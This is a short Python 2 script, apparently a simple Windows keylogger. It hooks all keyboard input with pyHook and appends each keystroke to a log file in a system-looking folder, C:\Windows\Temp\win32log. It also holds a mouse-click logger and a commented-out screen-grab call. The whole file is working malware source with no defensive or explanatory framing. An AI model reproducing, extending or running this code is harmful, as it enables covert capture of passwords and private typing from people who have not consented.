import win32api
import sys, os
import pythoncom, pyHook
import wincat

buffer = ''

def OnKeyboardEvent(event):
    if event.Ascii == 26:
        sys.exit()

    print 'Key pressed: ', event.Ascii

    if not os.path.exists('C:\\Windows\\Temp\\win32log'):
        os.makedirs('C:\\Windows\\Temp\\win32log')

    with open('C:\\Windows\\Temp\\win32log\\log.txt', 'a') as text_file:
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '[Enter]\n'
        if event.Ascii == 8:
            keylogs = '[BACKSPACE]'
        if event.Ascii == 0:
            keylogs = ''

        text_file.write(keylogs)

def OnMouseEvent(event):
    mouselogs = 'Mouse clicked on (' + str(event.Position[0]) + ',' + str(event.Position[1]) + ')'
    print mouselogs

    if not os.path.exists('C:\\Windows\\Temp\\win32log'):
        os.makedirs('C:\\Windows\\Temp\\win32log')

    with open('C:\\Windows\\Temp\\win32log\\log.txt', 'a') as text_file:
        text_file.write(mouselogs + '\n')

    #screenGrab(event.Position)

def main():
    print 'Input Ctrl + Z to exit.'
    wincat.updateLastTime()
    while True:
        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        #hm.MouseLeftUp = OnMouseEvent
        #hm.HookMouse()
        # wait forever
        pythoncom.PumpMessages()

if __name__ == '__main__':
    main()
